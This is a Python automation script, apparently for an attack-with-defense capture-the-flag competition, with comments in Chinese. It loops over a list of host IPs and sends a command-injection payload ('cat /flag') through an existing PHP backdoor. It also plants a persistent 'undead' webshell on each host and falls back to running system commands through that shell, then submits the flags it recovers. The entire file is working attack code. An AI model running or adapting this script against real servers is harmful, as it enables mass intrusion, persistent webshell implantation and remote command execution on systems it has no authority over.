import time
from plugin.attack import *
from plugin.submit_flag import *
from plugin.load_file import *

if __name__ == '__main__':

    ## get方法payload ####
    url_path = '/index.php'
    method = 'get'
    payload = '?copyright=cat /flag'
    passwd = 'copyright'
    #####################
    ## post 方法payload ##
    # url_path = 'index.php'
    # method = 'post'
    # payload = {'pass': 'password', 'cmd': 'cat /flag'}
    #####################
    ip_txt = loadfile("./host_list.txt")
    ip_list = ip_txt.split("\n")
    while 1:
        print("\033[1;33m[开始本轮攻击]\033[0m" +
              time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))
        for ip in ip_list:
            if ip:
                flag = backdoor_attack(ip, url_path, method, payload)
                udshell_url = up_shell(ip, url_path, method, passwd)
                if flag != False:
                    submit(ip, flag)
                else:  # 原有后门异常后尝试利用不死马
                    udshell_path = os.path.dirname(url_path) + '/./'
                    udshell_payload = {'pass': 'shang',
                                       'a': "system('cat /flag');"}
                    flag = backdoor_attack(
                        ip, udshell_path, 'post', udshell_payload)
                    if flag != False:
                        submit(ip, flag)
